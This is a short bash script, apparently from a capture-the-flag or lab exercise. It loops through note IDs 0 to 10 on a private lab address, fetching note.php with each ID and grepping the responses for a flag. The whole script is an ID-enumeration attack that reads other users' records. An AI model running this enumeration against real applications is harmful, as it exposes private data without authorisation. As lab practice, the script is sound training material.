#!/bin/bash

for i in {0..10}
do 
    echo $i
    if ( curl -s http://10.10.199.243/note.php?note=$i | grep "flag" ); then
        echo "**** success ****"
        break
    fi    
done